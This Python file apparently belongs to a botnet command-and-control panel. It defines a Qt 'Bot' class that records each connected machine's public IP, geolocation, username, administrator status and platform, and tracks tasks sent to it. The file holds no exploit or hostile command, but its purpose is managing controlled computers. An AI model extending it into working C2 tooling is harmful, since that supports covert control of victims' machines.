from qtpy.QtCore import Signal, Slot
from QtPyNetwork.models import Device

from models.Events import Info, Task

import datetime


class Bot(Device):
    update_map = Signal(int, list)
    updated = Signal()

    def __init__(self, bot_id: int, ip: str, port: int, **kwargs):
        super(Bot, self).__init__(bot_id, ip, port)
        # add later - uniqe number for each computer
        # ip and port may change - use mac addr?
        self.hash = None

        self.public_ip = "Unknown"
        self.geolocation = "Unknown"
        self.platform = "Unknown"
        self.architecture = "Unknown"
        self.system_architecture = "Unknown"
        self.username = "Unknown"
        self.administrator = "Unknown"
        self.language = "Unknown"
        self.time_created = datetime.datetime.now()

        self.tasks = []
        self.next_task_id = 0
        self.update(kwargs)

    @Slot()
    def get_id(self):
        return self.id

    @Slot()
    def get_next_task_id(self):
        self.next_task_id = self.next_task_id + 1
        return self.next_task_id

    @Slot()
    def getTaskById(self, task_id):
        for task in self.tasks:
            if task.get_id() == task_id:
                return task

    @Slot(Info)
    def on_info_received(self, info: Info):
        data = {}
        for result in info.results:
            util = info.results.get(result)
            if result == "tasks":
                for task in util:
                    ev = Task(info.get_bot_id(), task.get("task_id"), task.get("task"), task.get("state"))
                    self.on_task_received(ev)
            else:
                if util.get("exit_code") == 0:
                    data[result] = util.get("result")
                    if result == "geolocation":
                        self.update_map.emit(self.id, data[result])
                else:
                    data[result] = "Unknown"
        self.update(data)

    @Slot(Task)
    def on_task_received(self, task: Task):
        """Triggered when bot receives new task and on finish."""
        for bot_task in self.tasks:
            if bot_task.get_id() == task.get_id():
                bot_task.update(task)
                self.updated.emit()
                return
        self.tasks.append(task)
        self.next_task_id = max(t.id for t in self.tasks)
        self.updated.emit()

    @Slot(dict)
    def update(self, response: dict):
        """Update bot attributes."""
        for key, value in response.items():
            if key and hasattr(self, key):
                setattr(self, key, value)
        self.updated.emit()
